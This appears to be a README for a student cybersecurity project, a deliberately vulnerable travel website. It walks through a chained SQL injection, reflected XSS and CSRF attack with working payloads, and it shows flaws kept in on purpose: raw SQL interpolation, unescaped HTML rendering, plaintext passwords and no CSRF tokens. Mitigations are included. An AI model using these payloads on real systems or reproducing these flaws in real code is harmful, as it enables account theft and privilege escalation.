# Wanderly — Vulnerable Travel Platform (Cybersecurity Demonstration Project)

## 1. System Architecture Overview

```text
+-------------------------------------------------------------------------+
|                           CLIENT SIDE (Browser)                         |
|   [React Engine] <---> [Bootstrap UI Components] <---> [Auth Provider] |
+-------------------------------------------------------------------------+
                                       ^
                                       | (Port 5173 /api/ Proxy)
                                       v
+-------------------------------------------------------------------------+
|                           SERVER SIDE (Node.js)                         |
|          [Express Routing Engine] <---> [Session Memory Store]          |
+-------------------------------------------------------------------------+
                                       ^
                                       | (Port 5432 Raw SQL Pipeline)
                                       v
+-------------------------------------------------------------------------+
|                         DATABASE TIER (PostgreSQL)                      |
|        [users]      [destinations]       [posts]       [comments]       |
+-------------------------------------------------------------------------+
```

---

## 2. Web Development Coursework Compliance Matrix

Per the specifications of the Web Development coursework, a group size of two students mandates a minimum layout threshold of **6 discrete application pages**. The application enforces strict universal cross-navigation headers, uniform responsiveness, and active client/server entry assertions.

### 2.1 Complete Page Manifest & Feature Matrix

| Page Name                   | Routed Path     | Target Functional Purpose                                                                                                                                                           | Form Handling / Input Validation Features                                                                                                                                    |
| :-------------------------- | :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Home Dashboard**          | `/`             | Responsive portal showcasing platform capabilities, key travel stats counters, core layout feature-grids, and dynamic customized welcome headers using current authenticated state. | _None (Display & Application Navigation Portal)._                                                                                                                            |
| **User Sign In**            | `/login`        | High-security layout containing user authentication interface. Connected directly to raw database match-checking.                                                                   | Single-state input forms. Captures emails and raw strings. Passwords match via state. Exposes native raw database errors directly to error-boxes upon query failures.        |
| **Account Creation**        | `/signup`       | System registration screen allowing generation of standard access user profiles with auto-assigned `user` tier roles.                                                               | Active client-side field validation: Enforces non-empty usernames, structurally validated emails, a minimum 6-character boundary for passwords, and structural match checks. |
| **Destinations Portal**     | `/destinations` | Travel catalog explorer. Interrogates database collection; outputs dynamic cards containing name, location, pricing, trip duration, and visual imagery assets.                      | Real-time text filter form processing queries against the database text fields via an on-submit handler. Displays string parameters directly back into the view.             |
| **Travel Blog**             | `/blog`         | Content delivery interface rendering multi-column editorial travel logs. Features deep-linking into individual articles with active user commenting capabilities.                   | Live text-area comment processing block. Validates string length presence before submitting via asynchronous fetch headers back to the server storage array.                 |
| **Profile & Control Panel** | `/profile`      | User account card showcasing profile identifiers. If accessed by an `admin` user, it updates dynamically into an administrative user control board.                                 | Interactive privilege management forms. Generates dynamic user list tables from the database and appends single-click target execution hooks to promote user tiers.          |

### 2.2 Core Web Requirements Execution

- **Responsive Fluidity:** The layout leverages Bootstrap's responsive grid system (`row`, `col-sm-6`, `col-md-4`), elastic container structures, and dynamic visibility flags to render across standard mobile devices, tablets, and full desktop displays.
- **Stateful Navigation:** A persistent `Navbar.jsx` component implements synchronized routing states via React Router's `NavLink`. The layout adjusts dynamically to show appropriate public or private routes based on the real-time application context provided by `AuthContext.jsx`.
- **Input Validation Architecture:** Forms implement strict frontend validations (e.g., matching passwords, password length constraints, and presence checks) combined with backend verification checks to reject empty submissions or duplicate registration records.

---

## 3. Cybersecurity Coursework Specification: The Chained Attack Vector

The primary objective of the cybersecurity portion of this project is to implement, execute, and document a multi-layered, chained vulnerability path. By linking three distinct security flaws together in a realistic attack sequence, an attacker can escalate privileges from a standard user account to full administrative control.

```text
+------------------------+      +------------------------+      +------------------------+
|  1. SQL INJECTION      |      |  2. REFLECTED XSS      |      |  3. EXECUTED CSRF      |
|  - Reconnaissance Phase|      |  - Delivery Mechanism  |      |  - Privilege Change    |
|  - Extract Admin Email | ===> |  - Inject Script Link  | ===> |  - Target Admin Browser|
|    & Metadata Identity |      |  - Render via innerHTML|      |  - Fire Promotion API  |
+------------------------+      +------------------------+      +------------------------+
                                          ||
                                          \/
                           +-------------------------------+
                           |      ATTACKER ESCALATION      |
                           |       Full Admin Access       |
                           +-------------------------------+
```

---

## 3.1 Chain Link 1: SQL Injection (Reconnaissance Phase)

- **Vulnerable Endpoint:** `GET /api/destinations?search=`

- **Underlying Exploit Mechanism:** The search input value provided by the user is directly interpolated into a raw SQL command string within `server.js` without sanitization or parameterization:

```javascript
query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%' OR country ILIKE '%${search}%'`;
```

- **Exploitation Objective:** By inputting an unescaped single quote (`'`), an attacker can break out of the string boundary of the `ILIKE` clause. By appending a structural `UNION SELECT` command, the attacker can force the database engine to append rows from the private `users` table directly to the destination results layout returned to the UI.

---

## 3.2 Chain Link 2: Reflected Cross-Site Scripting (Attack Delivery Phase)

- **Vulnerable Component:** `Destinations.jsx`

- **Underlying Exploit Mechanism:** The application reads the raw query search parameter `q` from the current active browser URL bar via React Router's `useSearchParams()`. Instead of rendering this string as text, the interface directly injects the raw input string directly into the page layout via the `dangerouslySetInnerHTML` property to display back to the user:

```javascript
<span dangerouslySetInnerHTML={{ __html: search }} />
```

- **Exploitation Objective:** While modern web browsers filter direct inline `<script>` tags injected via standard `innerHTML` updates, they fully execute inline JavaScript event hooks embedded within standard markup components (e.g., the `onerror` attribute of an `<img>` tag). This allows an attacker to execute arbitrary client-side code in any user's browser by getting them to visit a maliciously crafted link.

---

## 3.3 Chain Link 3: Cross-Site Request Forgery via XSS (Privilege Escalation Phase)

- **Vulnerable Endpoint:** `POST /api/promote/:userId`

- **Underlying Exploit Mechanism:** The state-changing administrative endpoint `/api/promote/:userId` checks if the incoming request session is authenticated and assigned the `admin` role, but it does not validate a unique, cryptographically random anti-CSRF token.

- **Exploitation Objective:** Because the session token cookie (`connect.sid`) is automatically sent by the browser with every request made to the origin server, an administrative user who executes code via the Reflected XSS link will implicitly make an authenticated `POST` request to the promotion endpoint. The XSS script can trigger an automated background fetch operation targeting `/api/promote/<attacker_id>`, executing the payload within the admin's session context and elevating the attacker's account privileges.

---

# 4. Live Demonstration & Proof-of-Concept Exploit Steps

## 4.1 Local Setup Prerequisites

### 1. Create the PostgreSQL Database

```bash
createdb wanderly
```

Or manually create it using pgAdmin.

---

### 2. Initialize Tables & Seed Data

```bash
psql -U postgres -d wanderly -f server/setup.sql
```

---

### 3. Configure Environment Variables

Inside the `server` folder:

```bash
cp .env.example .env
```

Then edit `.env`:

```env
DATABASE_URL=postgresql://postgres:YOUR_PASSWORD@localhost:5432/wanderly
SESSION_SECRET=supersecretkey
PORT=5000
```

---

### 4. Start Backend Server

```bash
cd server
npm install
npm start
```

Expected output:

```text
Server running on http://localhost:5000
```

---

### 5. Start Frontend Client

Open another terminal:

```bash
cd client
npm install
npm run dev
```

Expected output:

```text
Local: http://localhost:5173
```

---

# 4.2 Detailed Exploitation Execution Steps

## Step 1 — Generate the Attacker Testing Profile

1. Open an Incognito browser window.
2. Navigate to:

```text
http://localhost:5173/signup
```

3. Register with:

| Field    | Value              |
| -------- | ------------------ |
| Username | hacker             |
| Email    | hacker@exploit.com |
| Password | hackme123          |

4. After signup, navigate to:

```text
http://localhost:5173/profile
```

5. Observe your User ID (usually `2`).

---

## Step 2 — Execute SQL Injection

Navigate to:

```text
http://localhost:5173/destinations
```

Paste this payload into the search box:

```sql
nonexistent' UNION SELECT id, username, email, password, 0, role, 'https://placehold.co/400x200' FROM users--
```

Click **Search**.

### Successful Result Indicators

- Destination cards now display database users instead of destinations.
- Admin email appears.
- Admin plaintext password appears.
- Admin role appears.

Expected visible records:

| Username | Email              | Password | Role  |
| -------- | ------------------ | -------- | ----- |
| admin    | admin@wanderly.com | admin123 | admin |

---

## Step 3 — Execute Reflected XSS

Paste this URL directly into the browser address bar:

```text
http://localhost:5173/destinations?q=<img src=x onerror=alert('Reflected-XSS-Execution-Proof')>
```

### Successful Result Indicators

- Browser alert popup appears.
- Broken image icon appears on page.
- Search term renders as HTML instead of escaped text.

---

## Step 4 — Execute XSS → CSRF Privilege Escalation

Replace `2` with your attacker account ID:

```text
http://localhost:5173/destinations?q=<img src=x onerror="fetch('/api/promote/2',{method:'POST',credentials:'include'})">
```

---

### Simulate the Administrator Session

Open another browser or Incognito window.

Navigate to:

```text
http://localhost:5173/login
```

Login using:

| Field    | Value              |
| -------- | ------------------ |
| Email    | admin@wanderly.com |
| Password | admin123           |

Now paste the crafted exploit URL into the address bar and press Enter.

---

## Step 5 — Verify Privilege Escalation

Return to the attacker browser session.

Navigate to:

```text
http://localhost:5173/profile
```

### Successful Result Indicators

- User role badge changes from `user` to `Admin`.
- Admin dashboard appears.
- User management table becomes visible.

The attacker account now has full administrator access.

---

# 5. Relational Database Schema Architecture

```text
+------------------+          +------------------+
|      users       |          |   destinations   |
+------------------+          +------------------+
| id (PK, Serial)  |          | id (PK, Serial)  |
| username (Text)  |          | name (Text)      |
| email (Text, UQ) |          | country (Text)   |
| password (Text)  |          | description(Text)|
| role (Text)      |          | price (Int)      |
+------------------+          | duration (Text)  |
                              | image (Text)     |
                              +------------------+

+------------------+          +------------------+
|     comments     |          |      posts       |
+------------------+          +------------------+
| id (PK, Serial)  |          | id (PK, Serial)  |
| post_id (FK)     | -------> | title (Text)     |
| username (Text)  |          | excerpt (Text)   |
| body (Text)      |          | body (Text)      |
| created_at (TS)  |          | author (Text)    |
+------------------+          | image (Text)     |
                              | created_at (TS)  |
                              +------------------+
```

---

## 5.1 System Entities Reference Data

### `users`

Stores:

- usernames
- email identities
- plaintext passwords
- authorization role levels (`user`, `admin`)

### `destinations`

Stores:

- travel destination records
- pricing
- trip durations
- image assets

### `posts`

Feeds the travel blog interface.

### `comments`

Stores user comments linked to blog posts through:

```sql
post_id REFERENCES posts(id) ON DELETE CASCADE
```

---

# 6. Defense-in-Depth Mitigation Blueprints

```text
ATTACK LAYER                    CONTROL REMEDIAL ACTION
+-------------------------+     +-----------------------------------+
| SQL Injection Route     | ==> | Parameterized Queries             |
+-------------------------+     +-----------------------------------+
| Reflected XSS Render    | ==> | React Context Escaping            |
+-------------------------+     +-----------------------------------+
| Stored XSS Comments     | ==> | DOMPurify Sanitization            |
+-------------------------+     +-----------------------------------+
| Cross-Site CSRF State   | ==> | Anti-CSRF Token Validation        |
+-------------------------+     +-----------------------------------+
| Plaintext Passwords     | ==> | bcrypt Password Hashing           |
+-------------------------+     +-----------------------------------+
```

---

## 6.1 SQL Injection Mitigation

### Vulnerable

```javascript
query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%'`;
```

### Secure

```javascript
const query =
  "SELECT * FROM destinations WHERE name ILIKE $1 OR country ILIKE $1";

const values = [`%${search}%`];

const result = await pool.query(query, values);
```

---

## 6.2 Reflected XSS Mitigation

### Vulnerable

```javascript
dangerouslySetInnerHTML;
```

### Secure

```javascript
<p>
  Showing results for: <strong>{search}</strong>
</p>
```

React automatically escapes dangerous HTML entities.

---

## 6.3 Stored XSS Mitigation

```javascript
import DOMPurify from "dompurify";

const sanitizedComment = DOMPurify.sanitize(comment);
```

---

## 6.4 CSRF Mitigation

```javascript
app.post(
  "/api/promote/:userId",
  requireAdmin,
  verifyCsrfToken,
  async (req, res) => {
    // protected route
  },
);
```

---

## 6.5 Password Hashing Mitigation

```javascript
const bcrypt = require("bcrypt");

const hashedPassword = await bcrypt.hash(password, 12);
```

---

# 7. Operational Commands Quick Reference

## 7.1 Development Environment Controls

### Initialize Database

```bash
psql -U postgres -d wanderly -f server/setup.sql
```

### Start Backend

```bash
cd server
npm install
npm start
```

### Start Frontend

```bash
cd client
npm install
npm run dev
```

---

## 7.2 Git Branch Controls

### Show Current Branch

```bash
git branch
```

### Switch to Vulnerable Branch

```bash
git checkout simple-vulnerable
```

### Review Local Repository State

```bash
git status
git log --oneline
```
